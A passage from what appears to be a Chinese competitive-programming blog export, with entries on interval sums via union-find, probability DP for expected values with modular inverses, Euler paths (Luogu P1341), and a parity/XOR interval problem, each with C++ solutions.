class="math inline">\(l_{i}, r_{i}, S_{i}\)</span>。</p>
<p>接下来 <span class="math inline">\(Q\)</span> 行，每行包含 <span
class="math inline">\(2\)</span> 个整数 <span
class="math inline">\(l\)</span> 和 <span
class="math inline">\(r\)</span>，代表一个小蓝想知道的部分和。</p>
<h2 id="输出格式">输出格式</h2>
<p>对于每个询问, 输出一行包含一个整数表示答案。如果答案无法确定, 输出
<code>UNKNOWN</code>。</p>
<h2 id="样例-1">样例 #1</h2>
<h3 id="样例输入-1">样例输入 #1</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5 3 3</span><br><span class="line">1 5 15</span><br><span class="line">4 5 9</span><br><span class="line">2 3 5</span><br><span class="line">1 5</span><br><span class="line">1 3</span><br><span class="line">1 2</span><br></pre></td></tr></table></figure>
<h3 id="样例输出-1">样例输出 #1</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">15</span><br><span class="line">6</span><br><span class="line">UNKNOWN</span><br></pre></td></tr></table></figure>
<h2 id="提示">提示</h2>
<p>对于 <span class="math inline">\(10 \%\)</span> 的评测用例, <span
class="math inline">\(1 \leq N, M, Q \leq 10,-100 \leq S_{i} \leq
100\)</span> 。</p>
<p>对于 <span class="math inline">\(20 \%\)</span> 的评测用例, <span
class="math inline">\(1 \leq N, M, Q \leq 20,-1000 \leq S_{i} \leq
1000\)</span> 。</p>
<p>对于 <span class="math inline">\(30 \%\)</span> 的评测用例, <span
class="math inline">\(1 \leq N, M, Q \leq 50,-10000 \leq S_{i} \leq
10000\)</span> 。</p>
<p>对于 <span class="math inline">\(40 \%\)</span> 的评测用例, <span
class="math inline">\(1 \leq N, M, Q \leq 1000,-10^{6} \leq S_{i} \leq
10^{6}\)</span> 。</p>
<p>对于 <span class="math inline">\(60 \%\)</span> 的评测用例, <span
class="math inline">\(1 \leq N, M, Q \leq 10000,-10^{9} \leq S_{i} \leq
10^{9}\)</span> 。</p>
<p>对于所有评测用例, <span class="math inline">\(1 \leq N, M, Q \leq
10^{5},-10^{12} \leq S_{i} \leq 10^{12}, 1 \leq l_{i} \leq r_{i} \leq
N\)</span>, <span class="math inline">\(1 \leq l \leq r \leq N\)</span>
。数据保证没有矛盾。</p>
<p>蓝桥杯 2022 省赛 A 组 J 题。</p>
<h2 id="题解">题解</h2>
<p>假设已知[l,r+1)等区间和，求其他区间和。其他区间和一般要通过区间的加减，我们对已知[l,r
+ 1)和建立一个l到r+1的有向边，</p>
<figure>
<img src="区间和并查集.png" alt="区间和并查集" />
<figcaption aria-hidden="true">区间和并查集</figcaption>
</figure>
]]></content>
      <tags>
        <tag>并查集</tag>
      </tags>
  </entry>
  <entry>
    <title>概率dp</title>
    <url>/2024/03/13/%E6%A6%82%E7%8E%87dp/</url>
    <content><![CDATA[<h1 id="期望是什么">期望是什么</h1>
<p>假如一个事件A对应多种取值（例如买彩票中奖，抛硬币），求解期望的方式是求和取值与取值对应概率的积，用公式表示为：
<span class="math display">\[
    E(A) = \sum_{i = 0}^{n - 1}P_{i}A_{i}
\]</span></p>
<p>例如彩票中5、10、15元的概率为0.1、0.05、0.01，那么中奖钱数期望为<span
class="math inline">\(5 * 0.1 + 10 * 0.05 + 15 * 0.01\)</span></p>
<h1 id="期望的性质">期望的性质</h1>
<ol type="1">
<li>如A、B事件概率上独立，则有E(AB) = E(A)E(B)，概率独立是指<span
class="math inline">\(P_{A_{i}B_{i}} =
P_{A_{i}}P_{B_{i}}\)</span>。（概率上独立和事件独立不是一回事，事件独立是指两个事件的结果互不影响，例如掷骰子的每次一都不会影响下一次的结果。事件AB概率上独立是指概率值满足<span
class="math inline">\(P_{A_{i}B_{i}} =
P_{A_{i}}P_{B_{i}}\)</span>，与两事件是否独立无关）</li>
</ol>
<p><strong>证明：</strong> <span class="math display">\[
\begin{cases}
E(AB) &amp;= \sum_{i = 0,j =
0}^{i&lt;n,j&lt;m}{P_{A_{i}B_{j}}A_{i}B_{j}}\\
&amp;=\sum_{i = 0,j = 0}^{i&lt;nj&lt;n}P_{A_{i}}A_{i}P_{B_{j}}B_{j}\\
\end{cases}
\]</span>
观察发现，求和式子中A、B相关求解可分离（联想积分处理方式，如<span
class="math inline">\(\int_{0}^{1}\int_{2}^{3}xydxdy =
\int_{0}^{1}xdx\int_{2}^{3}ydy\)</span> ）故可将其拆分为如下表达式：</p>
<p><span class="math display">\[
\begin{cases}
E(AB) &amp;=\sum_{i = 0,j =
0}^{i&lt;n,j&lt;n}P_{A_{i}}A_{i}P_{B_{j}}B_{j}\\
&amp;=\sum_{i = 0}^{i&lt;n}P_{A_{i}}A_{i}\sum_{j = 0}^{j &lt;
n}P_{B_{j}}B_{j}\\
&amp;=E(A)E(B)
\end{cases}
\]</span></p>
<ol start="2" type="1">
<li><span class="math inline">\(E(A + B) \neq E(A) + E(B)\)</span></li>
</ol>
<p>可尝试给出表达式的形式观察表达式是否相等</p>
<p><span class="math display">\[
E(A+B) = \sum_{i = 0,j = 0}^{i &lt; n,j&lt;m}P_{A_{i}B_{j}}(A_{i} +
B_{j})\\
E(A) + E(B) = \sum_{i = 0}^{n}P_{A_{i}}A_{i} + \sum_{j =
0}^{m}P_{B_{i}}B_{i}
\]</span></p>
<p><strong>3. 事件A会导致事件B、C中的一个发生，概率为<span
class="math inline">\(P_{B}、P_{C}\)</span>，则期望表达式为：</strong>
<span class="math display">\[
E(A) = P_{B}E(B) + P_{C}E(C)
\]</span> 证明：</p>
<p>假设B事件取值情况为<span
class="math inline">\(B_{i}\)</span>，相应概率为<span
class="math inline">\(P_{B_{i}}\)</span>。C事件取值情况为<span
class="math inline">\(C_{j}\)</span>相应概率为<span
class="math inline">\(P_{C_{j}}\)</span>，则有E(A)的表达式为： <span
class="math display">\[
\begin{cases}
E(A) &amp;= \sum_{i = 0}^{n - 1}P_{B}P_{B_{i}}B_{i} + \sum_{j = 0}^{m -
1}  P_{C}P_{C_{j}}C_{j}\\
&amp;= P_{B}\sum_{i = 0}^{n - 1}P_{B_{i}}B_{i} + P_{C}\sum_{j = 0}^{m -
1}  P_{C_{j}}C_{j}
&amp;= P_{B}E(B) + P_{C}E(C)
\end{cases}
\]</span></p>
<h1 id="题目">题目</h1>
<h3 id="题目描述">题目描述</h3>
<p>有一只甲壳虫想要爬上一颗高度为 n 的树，它一开始位于树根, 高度为
0，当它尝试从高度 i−1 爬到高度为 i 的位置时有 Pi 的概率会掉回树根,
求它从树根爬到树顶时, 经过的时间的期望值是多少。 ### 输入格式</p>
<p>输入第一行包含一个整数n表示树的高度。</p>
<p>接下来 n 行每行包含两个整数 xi,yi, 用一个空格分隔，表示 Pi=xiyi 。
### 输出格式</p>
<p>输出一行包含一个整数表示答案，答案是一个有理数，请输出答案对质数
998244353 取模的结果。其中有理数 <span
class="math inline">\(\frac{a}{b}\)</span> 对质数 P 取模的结果是整数 c
满足 0≤cP 且 c⋅b≡a( mod P) 。</p>
<p>答： 绘制事件的展开树，利用上方期望第三个特点给出结论可有如下推导：
<img src="_概率dp甲壳虫爬树.png" alt="_概率dp甲壳虫爬树" />
观察s与t可通过迭代求解，接触s与t即可完成求解</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*================================================================</span></span><br><span class="line"><span class="comment">*   Copyright (C) 2024 Wang XinPeng. All rights reserved.</span></span><br><span class="line"><span class="comment">*   </span></span><br><span class="line"><span class="comment">*   filename:     P8774.cpp</span></span><br><span class="line"><span class="comment">*   username:     skt1faker</span></span><br><span class="line"><span class="comment">*   create time:  22:35  2024.03.12</span></span><br><span class="line"><span class="comment">*   modify time:  09:44  2024.03.13</span></span><br><span class="line"><span class="comment">*   email:        skk1faker@163.com</span></span><br><span class="line"><span class="comment">*   descripe:     </span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">================================================================*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> lll __int128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEBUG0</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod1 = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod2 = <span class="number">998244353</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxx = (<span class="type">int</span>)<span class="number">1e5</span> + <span class="number">10</span>; </span><br><span class="line">ll p[maxx];</span><br><span class="line"><span class="function">ll <span class="title">inv_mod</span><span class="params">(ll a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> b = mod2 - <span class="number">2</span>;</span><br><span class="line">  ll ans = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span>(b)&#123;</span><br><span class="line">    <span class="keyword">if</span>(b &amp; <span class="number">1</span>)</span><br><span class="line">      ans = (ans * a) % mod2;</span><br><span class="line">    b /= <span class="number">2</span>;</span><br><span class="line">    a = (a * a) % mod2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  cin&gt;&gt;n;</span><br><span class="line">  ll ans = <span class="number">0</span>;</span><br><span class="line">  ll x,y;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; n;i++)&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lld%lld&quot;</span>,&amp;x,&amp;y);</span><br><span class="line">    p[i] = (x * <span class="built_in">inv_mod</span>(y)) % mod2;</span><br><span class="line">  &#125;</span><br><span class="line">  ll s = <span class="number">0</span>;</span><br><span class="line">  ll t = <span class="number">0</span>;</span><br><span class="line">  ll temp_s = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; n;i++)&#123;</span><br><span class="line">    s = (s + (p[i] * temp_s) % mod2) % mod2;</span><br><span class="line">    t = (t + (((p[i] * (i + <span class="number">1</span>)) % mod2) * temp_s) % mod2 ) % mod2;</span><br><span class="line">    temp_s = (temp_s * (<span class="number">1</span> - p[i] + mod2) % mod2) % mod2;</span><br><span class="line">  &#125;</span><br><span class="line">  t = (t + (n * temp_s) % mod2) % mod2;</span><br><span class="line">  ans = (t * <span class="built_in">inv_mod</span>(<span class="number">1</span> - s + mod2)) % mod2;</span><br><span class="line">  cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="补充乘法逆元的计算">补充，乘法逆元的计算</h2>
<h3 id="逆元的作用">逆元的作用</h3>
<p>逆元是一种规定，规定了模运算中除法的计算方式，<span
class="math inline">\(x/y\ mod\ p\)</span>可表示为<span
class="math inline">\(xy^{-1}\ mod\ p\)</span>，其中<span
class="math inline">\(y^{-1}\)</span>为模p下y的逆元。</p>
<p>由于y / y mod = 1,所以<span class="math inline">\(y \times y^{-1}\
mod\ p= 1\)</span>。</p>
<h3 id="如何求解逆元">如何求解逆元</h3>
<p>费马小定理为如下形式： <span class="math display">\[
1 = a^{p - 1} mod p,p为质数
\]</span></p>
<p>可以得到在模p计算下，a的逆元为<span class="math inline">\(a^{p -
2}\)</span>，使用快速幂模p求解即可。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">ll <span class="title">inv_mod</span><span class="params">(ll a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> b = p - <span class="number">2</span>;</span><br><span class="line">  ll ans = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span>(b)&#123;</span><br><span class="line">    <span class="keyword">if</span>(b &amp; <span class="number">1</span>)</span><br><span class="line">      ans = (ans * a) % p;</span><br><span class="line">    b /= <span class="number">2</span>;</span><br><span class="line">    a = (a * a) % p;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>dp</tag>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title>欧拉路径</title>
    <url>/2024/06/21/%E6%AC%A7%E6%8B%89%E8%B7%AF%E5%BE%84/</url>
    <content><![CDATA[<h1
id="无向图如何判断欧拉路径或者回路是否存在">无向图如何判断欧拉路径或者回路是否存在</h1>
<ol type="1">
<li>无向图联通</li>
<li>无向图所有节点的度为偶数则存在欧拉回路，
欧拉路径有且仅有两个节点度为奇数，剩余全为偶数。</li>
</ol>
<h1
id="求解欧拉回路或者欧拉路径的思路">求解欧拉回路或者欧拉路径的思路</h1>
<p>如果图中存在环，将环去掉，图依旧能搜索出欧拉路径和欧拉回路，利用这个原理可以求解欧拉回路。不断的求解图中的环，将环去掉，最后组装，得到欧拉回路。</p>
<p>按照上述思路给出欧拉路径求解代码所有</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//ans = ans + char(x + &#x27;A&#x27;);		// 注意不能这么写</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">58</span>;i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(vis[x][i] == <span class="number">1</span> || G[x][i] == <span class="number">0</span>)	</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		count++;</span><br><span class="line">		vis[x][i] = <span class="number">1</span>;</span><br><span class="line">		vis[i][x] = <span class="number">1</span>;</span><br><span class="line">		<span class="built_in">dfs</span>(i);             <span class="comment">// 回溯到这里说明已经找不到前进的路，那么这段路应该作为答案的结尾，因为这段路已经找不到前进的路。剩余未访问的边均为环，需要补充在路径中。刚刚的路径开始位置（也就是目前回溯回来的位置）要么接着一个环，要么接着到起点的一个路径。</span></span><br><span class="line">	&#125;</span><br><span class="line">	ans = <span class="built_in">char</span>(x + <span class="string">&#x27;A&#x27;</span>) + ans;		<span class="comment">// dfs后会产生一段路径，根据上述分析，回溯结束产生的路径应放在结尾。并且因为必须要先把结尾的路径确实才能确定后续的路径，所以采用了类似于后续遍历，不能使用前序遍历。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> start_posi = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(deg[i] % <span class="number">2</span> == <span class="number">1</span>)&#123;</span><br><span class="line">            count++;</span><br><span class="line">            start_posi = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(count == <span class="number">0</span> || count == <span class="number">2</span>)</span><br><span class="line">        <span class="built_in">dfs</span>(start_posi);</span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上述代码注释位置的图解如下： <img src="huisu.png" alt="回溯" /></p>
<p>可以见到，上述回溯位置之后的路径应该放在答案的结尾，他们找不到下一个可行的边，所以应该放在最后一个位置。所以每次都是在dfs计算完结尾路径之后才将当前位置加入路径。</p>
<h1 id="洛谷p1341">洛谷P1341</h1>
<h1 id="无序字母对">无序字母对</h1>
<h2 id="题目描述">题目描述</h2>
<p>给定 <span class="math inline">\(n\)</span>
个各不相同的无序字母对（区分大小写，无序即字母对中的两个字母可以位置颠倒）。请构造一个有
<span class="math inline">\((n+1)\)</span>
个字母的字符串使得每个字母对都在这个字符串中出现。</p>
<h2 id="输入格式">输入格式</h2>
<p>第一行输入一个正整数 <span class="math inline">\(n\)</span>。</p>
<p>第二行到第 <span class="math inline">\((n+1)\)</span>
行每行两个字母，表示这两个字母需要相邻。</p>
<h2 id="输出格式">输出格式</h2>
<p>输出满足要求的字符串。</p>
<p>如果没有满足要求的字符串，请输出 <code>No Solution</code>。</p>
<p>如果有多种方案，请输出字典序最小的方案（即满足前面的字母的 ASCII
编码尽可能小）。</p>
<h2 id="样例-1">样例 #1</h2>
<h3 id="样例输入-1">样例输入 #1</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4</span><br><span class="line">aZ</span><br><span class="line">tZ</span><br><span class="line">Xt</span><br><span class="line">aX</span><br></pre></td></tr></table></figure>
<h3 id="样例输出-1">样例输出 #1</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">XaZtX</span><br></pre></td></tr></table></figure>
<h2 id="提示">提示</h2>
<p>不同的无序字母对个数有限，<span class="math inline">\(n\)</span>
的规模可以通过计算得到。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*================================================================</span></span><br><span class="line"><span class="comment">*   Copyright (C) 2024 Wang XinPeng. All rights reserved.</span></span><br><span class="line"><span class="comment">*   </span></span><br><span class="line"><span class="comment">*   filename:     P1341.cpp</span></span><br><span class="line"><span class="comment">*   username:     skt1faker</span></span><br><span class="line"><span class="comment">*   create time:  11:49  2024.06.21</span></span><br><span class="line"><span class="comment">*   modify time:  11:49  2024.06.21</span></span><br><span class="line"><span class="comment">*   email:        skk1faker@163.com</span></span><br><span class="line"><span class="comment">*   descripe:     </span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">================================================================*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> lll __int128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEBUG0</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod1 = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod2 = <span class="number">998244353</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxx = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> vis[<span class="number">58</span>][<span class="number">58</span>],G[<span class="number">58</span>][<span class="number">58</span>];</span><br><span class="line"><span class="type">int</span> to[maxx];</span><br><span class="line"><span class="type">int</span> next_[maxx];</span><br><span class="line"><span class="type">int</span> head[<span class="number">58</span>],tot;</span><br><span class="line"><span class="type">int</span> fa[<span class="number">58</span>],have_one[<span class="number">58</span>],deg[<span class="number">58</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">memset</span>(head,<span class="number">-1</span>,<span class="built_in">sizeof</span>(head));</span><br><span class="line">	<span class="built_in">memset</span>(have_one,<span class="number">-1</span>,<span class="built_in">sizeof</span>(have_one));</span><br><span class="line">	tot = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find_fa</span><span class="params">(<span class="type">int</span> a)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(fa[a] == a)<span class="keyword">return</span> a;</span><br><span class="line">	<span class="keyword">return</span> fa[a] = <span class="built_in">find_fa</span>(fa[a]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">merge</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> fa_x = <span class="built_in">find_fa</span>(x),fa_y = <span class="built_in">find_fa</span>(y);</span><br><span class="line">	<span class="keyword">if</span>(fa_x != fa_y)fa[fa_x] = fa_y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add_edge</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">merge</span>(a,b);</span><br><span class="line">	deg[a] ++;</span><br><span class="line">	deg[b] ++;</span><br><span class="line">	have_one[a] = <span class="number">1</span>;</span><br><span class="line">	G[a][b] = <span class="number">1</span>;</span><br><span class="line">	G[b][a] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">string ans;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">	<span class="comment">//ans = ans + char(x + &#x27;A&#x27;);</span></span><br><span class="line">	<span class="comment">//cout&lt;&lt;ans&lt;&lt;endl;</span></span><br><span class="line">	<span class="comment">//for(int i = head[x];i != -1;i = next_[i])&#123;</span></span><br><span class="line">	<span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">58</span>;i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(vis[x][i] == <span class="number">1</span> || G[x][i] == <span class="number">0</span>)	</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		<span class="comment">//printf(&quot;%c%c\n&quot;,char(x + &#x27;A&#x27;),char(i + &#x27;A&#x27;));</span></span><br><span class="line">		<span class="comment">//if(count == 1)&#123;cout&lt;&lt;ans&lt;&lt;endl;assert(0);&#125;</span></span><br><span class="line">		count++;</span><br><span class="line">		vis[x][i] = <span class="number">1</span>;</span><br><span class="line">		vis[i][x] = <span class="number">1</span>;</span><br><span class="line">		<span class="built_in">dfs</span>(i);</span><br><span class="line">	&#125;</span><br><span class="line">	ans = <span class="built_in">char</span>(x + <span class="string">&#x27;A&#x27;</span>) + ans;		<span class="comment">// ??为什么这样写</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> n, min_val = <span class="number">100</span>;</span><br><span class="line">	<span class="built_in">init</span>();</span><br><span class="line">	cin&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; n;i++)&#123;</span><br><span class="line">		<span class="type">char</span> temp[<span class="number">3</span>];</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,temp);</span><br><span class="line">		<span class="comment">//printf(&quot;%s\n&quot;,temp);</span></span><br><span class="line">		<span class="built_in">add_edge</span>(temp[<span class="number">0</span>] - <span class="string">&#x27;A&#x27;</span>,temp[<span class="number">1</span>] - <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">		<span class="built_in">add_edge</span>(temp[<span class="number">1</span>] - <span class="string">&#x27;A&#x27;</span>,temp[<span class="number">0</span>] - <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">//cout&lt;&lt;temp[1] - &#x27;A&#x27;&lt;&lt;endl;</span></span><br><span class="line"></span><br><span class="line">		min_val = <span class="built_in">min</span>(min_val,temp[<span class="number">0</span>] - <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">		min_val = <span class="built_in">min</span>(min_val,temp[<span class="number">1</span>] - <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> fa_temp = <span class="built_in">find_fa</span>(min_val), flag = <span class="number">0</span>,flag1 = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">58</span> &amp;&amp; flag == <span class="number">0</span>;i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(have_one[i] == <span class="number">1</span>)&#123;</span><br><span class="line">			<span class="keyword">if</span>(((deg[i] / <span class="number">2</span>) % <span class="number">2</span>) == <span class="number">1</span>)&#123;</span><br><span class="line">				flag1 += <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">if</span>(flag1 == <span class="number">1</span>)min_val = i;</span><br><span class="line">			&#125;;</span><br><span class="line">			<span class="keyword">if</span>(<span class="built_in">find_fa</span>(i) != fa_temp)flag = <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(flag == <span class="number">0</span> &amp;&amp; (flag1 == <span class="number">0</span> || flag1 == <span class="number">2</span>))&#123;</span><br><span class="line">		<span class="built_in">dfs</span>(min_val);</span><br><span class="line">		cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> cout&lt;&lt;<span class="string">&quot;No Solution&quot;</span>&lt;&lt;endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>acm</tag>
        <tag>图论</tag>
      </tags>
  </entry>
  <entry>
    <title>牛客练习赛120-D题-区间异或问题</title>
    <url>/2024/01/15/%E7%89%9B%E5%AE%A2%E7%BB%83%E4%B9%A0%E8%B5%9B120-D%E9%A2%98-%E5%8C%BA%E9%97%B4%E5%BC%82%E6%88%96%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h1 id="题意">题意</h1>
<p>存在序列<code>a[i]</code>,
至多k次改动，每次改动可以将第i个元素+1，即<code>a[i] = a[i] + 1</code>，问，怎样安排改动可以使得序列的区间和为奇数的区间数量最多。</p>
<h1 id="题解">题解</h1>
<p>在给出题解之前，需要有一些预备知识：</p>
<ol type="1">
<li>简单来说，计算奇偶与异或有关
计算区间和为奇数与异或有关，设<code>b[i] = a[i] % 2</code>，则区间<code>[l,r]</code>内<code>a[i]</code>和奇偶性与<code>b[i]</code>的异或和一样，所以将问题简化，直接计算<code>b</code>的异或前缀和<code>pre_xor</code>即可。</li>
<li>异或前缀和<span class="math inline">\(pre\_xor[i] = b[0] \oplus b[1]
\oplus \dots b[n]\)</span>，则区间[l,r]异或和为<span
class="math inline">\(pre\_xor[l - 1] \oplus pre\_xor[r]\)</span>。
所以一个区间的异或和为奇数，那么参与计算的两个<span
class="math inline">\(pre\_xor[i]\)</span>不相等即可。</li>
</ol>
<p>根据以上知识可以知,只要改动中令<span
class="math inline">\(pre\_xor\)</span>的01数量均衡，就可以让奇数和区间增多（原因很简单，假设总共n个数，异或前缀和中有m个1，n
+ 1 - m个0
(前缀和中存在一个pre_xor不包含任意一个元素)，则奇数和区间数量为(n - m +
1) *
m个，这是二次函数，求最值即可）,已知将i位置操作会发生<code>a[i] = a[i] + 1</code>，相应的b[i]相当于与1进行了异或，pre_xor会在[i,n
+
1]区间内所有值从0变为1。前面分析如果想让奇数和区间数量变为最大值，可以使pre_xor中01数量均匀。这种操作只需要一次就能完成，现给出证明。</p>
<p>先将问题抽象为“给出任意个01序列x，存在一种操作能将<code>[i,n]</code>01翻转，请找出这个位置，使得0的数量和1的数量差距最小”。</p>
<p>先计算所有x中所有1的数量，然后从最后一个位置逐个向0位置进行01翻转，计算此时数列中1的数量，在每次进行01翻转时，1的数量只能增加1或减少1，是<strong>连续</strong>的，假设未经翻转前1的数量为k个（0数量与1数量差距为n-2k），那么全部翻转完1的数量应为n
- k个（01数量差距为2k -
n)，由于之中要寻找01数量差距为1或为0的位置，因为|<span
class="math inline">\(n - 2k\| &gt;=
0\)</span>，n-2k与2k-n异号，01数量差距曲线必穿越x轴。每次翻转后01数量变化为+2
或-2，所以当n为偶数时必有一个时刻数量差为0，当n为奇数的时候必有一个时刻数量差为1或-1。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*================================================================</span></span><br><span class="line"><span class="comment">*   Copyright (C) 2024 Wangxinpeng. All rights reserved.</span></span><br><span class="line"><span class="comment">*   </span></span><br><span class="line"><span class="comment">*   filename：    D.cpp</span></span><br><span class="line"><span class="comment">*   username:     skt1faker</span></span><br><span class="line"><span class="comment">*   create time:  20:24  2024.01.14</span></span><br><span class="line"><span class="comment">    email:        skk1faker@163.com</span></span><br><span class="line"><span class="comment">*   descripe:     </span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">================================================================*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEBUG0</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod1 = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod2 = <span class="number">998244353</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxx = (<span class="type">int</span>)<span 